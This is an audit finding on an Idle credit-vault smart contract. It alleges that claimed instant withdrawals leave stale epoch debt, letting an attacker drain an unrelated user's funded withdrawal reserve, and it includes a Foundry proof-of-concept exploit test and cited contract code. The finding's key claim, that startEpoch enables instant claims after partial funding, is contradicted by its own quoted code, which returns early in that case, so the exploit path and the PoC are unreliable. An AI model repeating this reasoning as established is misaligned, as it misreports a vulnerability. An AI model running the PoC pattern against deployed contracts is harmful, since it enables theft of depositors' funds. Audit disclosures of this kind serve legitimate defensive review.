### Title
Claimed instant withdrawals leave stale epoch debt that consumes unrelated funded reserves and corrupts default recovery - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary

`IdleCreditVault` records instant withdrawals both in the aggregate `instantWithdrawsRequests` and per-epoch mappings, but `claimInstantWithdrawRequest` clears only the aggregate balance. The stale per-epoch objects remain after the receipt has been burned and paid, and can later be counted again by default-recovery accounting. Additionally, a partially funded instant request can spend underlyings held for unrelated funded normal-withdrawal claims because those reserves are not segregated or tracked as liabilities. [1](#0-0) [2](#0-1) 

### Finding Description

An instant withdrawal request is added to `instantWithdrawsRequests`, `instantWithdrawsRequestsByEpoch`, `instantWithdrawClaimsByEpoch`, and `pendingInstantWithdraws`. [3](#0-2) 

When the next epoch starts, the CDO transfers whatever cash is currently available toward the pending instant queue, reduces `pendingInstantWithdraws`, and enables `allowInstantWithdraw` even when the queue was only partially funded. [4](#0-3)  `collectInstantWithdrawFunds` only decreases the global pending amount; it does not record which user's request was funded or reserve the transferred cash for a specific epoch receipt. [5](#0-4) 

`claimInstantWithdrawRequest` then calculates the claim using the user's aggregate request balance rather than a funded per-epoch amount. [6](#0-5)  The function clears `instantWithdrawsRequests[_user]` but does not clear `instantWithdrawsRequestsByEpoch[_user][epoch]` or `instantWithdrawClaimsByEpoch[epoch]`, leaving the already-paid request represented in recovery accounting. [7](#0-6) 

The strategy's normal funded-withdrawal reserves are also held as raw underlying in the same contract. `_transferFundedClaim` excludes only `defaultRecoveryReserve`; it does not reserve funded normal-withdrawal claims once `pendingWithdraws` was cleared by `collectWithdrawFunds`. [2](#0-1) [8](#0-7) 

If the borrower subsequently fails to fund the remaining instant queue, `defaultPendingClaimBasis` treats `instantWithdrawClaimsByEpoch[epochNumber]` as outstanding whenever `pendingInstantWithdraws` is nonzero. [9](#0-8)  `_defaultPrefundedInstantReserve` then treats `instantBasis - pendingInstantWithdraws` as cash already held by the strategy even though the attacker already withdrew that amount. [10](#0-9)  `finalizeDefaultRecovery` adds that nonexistent prefunded amount to `defaultRecoveryReserve` without requiring a corresponding balance. [11](#0-10) 

### Impact Explanation

An unprivileged KYC-passing lender can steal or permanently freeze funded withdrawal reserves equal to the unfunded portion of its instant request, capped by the amount of unrelated claim cash held by the strategy. [7](#0-6) 

For example, if a victim has 40 tokens in an already-funded normal withdrawal and the attacker's 100-token instant request receives only 60 tokens at `startEpoch`, the attacker can claim the full 100 tokens because the strategy has 100 tokens of aggregate underlying. [6](#0-5)  This breaks the one-receipt-one-payout and claim-funding invariants.

If the borrower defaults on the remaining 40 tokens, the stale 100-token epoch record is still counted as defaulted claim basis, while 60 tokens are treated as prefunded reserve despite having already been paid out. [9](#0-8) [10](#0-9)  Recovery claimants are diluted and later claims can permanently revert because `defaultRecoveryReserve` exceeds the strategy's actual underlying balance. [12](#0-11) 

### Likelihood Explanation

The attack requires three ordinary conditions rather than privileged misconduct: an unclaimed funded normal-withdrawal reserve exists, a new instant queue is only partially prefunded at `startEpoch`, and the attacker claims before other claimants. [4](#0-3)  Partial prefunding is explicitly supported because `collectInstantWithdrawFunds` accepts the smaller amount and `startEpoch` still enables claims. [13](#0-12) 

The permanent-loss variant additionally requires the borrower to miss the remaining instant funding obligation and the default to be finalized. [14](#0-13)  Even without that default, the attacker can temporarily consume funds earmarked for another user's funded claim until the borrower supplies the pending amount.

### Recommendation

Track funded and unfunded instant-withdrawal amounts separately per user and per epoch. `collectInstantWithdrawFunds` should allocate funding to outstanding epoch receipts, and `claimInstantWithdrawRequest` should pay only the funded receipt amount while clearing the corresponding per-user and per-epoch entries. [1](#0-0) 

The strategy should also maintain a `fundedWithdrawalClaims` liability for collected normal and instant receipts, or hold each claim bucket separately, so `_transferFundedClaim` cannot spend another bucket's underlying. `defaultPendingClaimBasis` should include only instant receipts that remain unclaimed, and prefunded recovery should be derived from tracked unpaid funded balances rather than `instantWithdrawClaimsByEpoch`. [9](#0-8) 

### Proof of Concept

The following Foundry scenario uses the existing `IdleCreditVault.t.sol` fork-test harness helpers. It demonstrates that a partially funded instant receipt can consume an unrelated funded normal withdrawal and leave stale default-epoch accounting.

```solidity
function testClaimedInstantLeavesStaleEpochAndDrainsFundedReserve() external {
  _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());

  address victim = makeAddr('victim');
  address attacker = makeAddr('attacker');
  uint256 victimDeposit = 40 * ONE_SCALE;
  uint256 attackerDeposit = 100 * ONE_SCALE;

  uint256 victimTranches = _depositWithUser(victim, victimDeposit, true);
  _depositWithUser(attacker, attackerDeposit, true);

  // Victim creates a normal request in the buffer.
  vm.prank(victim);
  cdoEpoch.requestWithdraw(victimTranches, address(AAtranche));

  // Fund the normal request at stopEpoch. Victim intentionally does not claim yet.
  _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());
  uint256 fundedNormalReserve = underlying.balanceOf(address(strategy));
  assertEq(fundedNormalReserve, victimDeposit);

  // The lower APR makes the attacker's buffer-period request an instant request.
  vm.prank(attacker);
  uint256 instantBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));
  assertEq(instantBasis, attackerDeposit);

  // Provide only part of the instant queue through a new buffer deposit.
  uint256 prefunded = 60 * ONE_SCALE;
  _depositWithUser(makeAddr('bufferDepositor'), prefunded, true);

  // startEpoch transfers the 60 prefunded tokens to the strategy and enables claims,
  // while pendingInstantWithdraws remains 40.
  vm.prank(manager);
  cdoEpoch.startEpoch();

  IdleCreditVault creditVault = IdleCreditVault(address(strategy));
  assertEq(creditVault.pendingInstantWithdraws(), instantBasis - prefunded);

  // The strategy holds 60 instant funding + 40 funded normal claim reserve.
  assertEq(underlying.balanceOf(address(creditVault)), instantBasis);

  uint256 attackerBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimInstantWithdrawRequest();

  // The aggregate claim burns the full 100 receipt and drains all 100 underlying:
  // 60 intended instant funding + 40 belonging to the victim's funded normal claim.
  assertEq(underlying.balanceOf(attacker) - attackerBefore, instantBasis);
  assertEq(underlying.balanceOf(address(creditVault)), 0);
  assertEq(creditVault.instantWithdrawsRequests(attacker), 0);

  // The paid request remains exported in per-epoch recovery accounting.
  uint256 epoch = creditVault.epochNumber();
  assertEq(creditVault.instantWithdrawsRequestsByEpoch(attacker, epoch), instantBasis);
  assertEq(creditVault.instantWithdrawClaimsByEpoch(epoch), instantBasis);

  // Victim's funded claim can no longer be paid.
  vm.prank(victim);
  vm.expectRevert();
  cdoEpoch.claimWithdrawRequest();

  // Borrower misses the remaining 40-token instant obligation.
  vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
  deal(defaultUnderlying, borrower, 0);
  vm.prank(manager);
  cdoEpoch.getInstantWithdrawFunds();
  assertTrue(cdoEpoch.defaulted());

  // Finalization counts the already-paid 60 as prefunded recovery.
  cdoEpoch.finalizeDefault(0, address(0));

  assertEq(creditVault.defaultRecoveryReserve(), prefunded);
  assertEq(underlying.balanceOf(address(creditVault)), 0);
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L365-392)
```text
    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }

  /// @notice claim the instant withdraw request
  /// @dev we transfer the underlying tokens
  /// @param _user address of the user
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L398-403)
```text
  function collectInstantWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    if (_amount == 0) return;
    pendingInstantWithdraws -= _amount;
    underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-430)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L644-648)
```text
  function defaultPendingClaimBasis() public view returns (uint256 basis) {
    basis = pendingWithdraws;
    if (pendingInstantWithdraws != 0) {
      basis += instantWithdrawClaimsByEpoch[epochNumber];
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L683-691)
```text
    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L716-722)
```text
  function _defaultPrefundedInstantReserve() internal view returns (uint256 prefundedReserve) {
    uint256 pendingInstant = pendingInstantWithdraws;
    if (pendingInstant == 0) return prefundedReserve;
    uint256 instantBasis = instantWithdrawClaimsByEpoch[epochNumber];
    if (instantBasis > pendingInstant) {
      prefundedReserve = instantBasis - pendingInstant;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L897-906)
```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L912-916)
```text
  function _transferDefaultRecovery(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    // Every defaulted or post-default claim consumes the isolated recovery reserve.
    defaultRecoveryReserve -= _amount;
    underlyingToken.safeTransfer(_user, _amount);
```

**File:** contracts/IdleCDOEpochVariant.sol (L276-292)
```text
    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
```

**File:** contracts/IdleCDOEpochVariant.sol (L558-573)
```text
  function getInstantWithdrawFunds() external {
    _checkOnlyOwnerOrManager();
    // Check that programmable mode is disabled, the epoch is running and the deadline passed.
    _checkNotAllowed(isProgrammableBorrower || !isEpochRunning || block.timestamp < instantWithdrawDeadline);

    IdleCreditVault _strategy = IdleCreditVault(strategy);
    uint256 _instantWithdraws = _pendingInstant();
    // transfer funds for instant withdraw to this contract
    try this.getFundsFromBorrower(_instantWithdraws) {
      // transfer funds to IdleCreditVault and decrease pendingInstantWithdraws
      _strategy.collectInstantWithdrawFunds(_instantWithdraws);
      // allow instant withdraws
      allowInstantWithdraw = true;
    } catch {
      _handleBorrowerDefault(_instantWithdraws);
    }
```
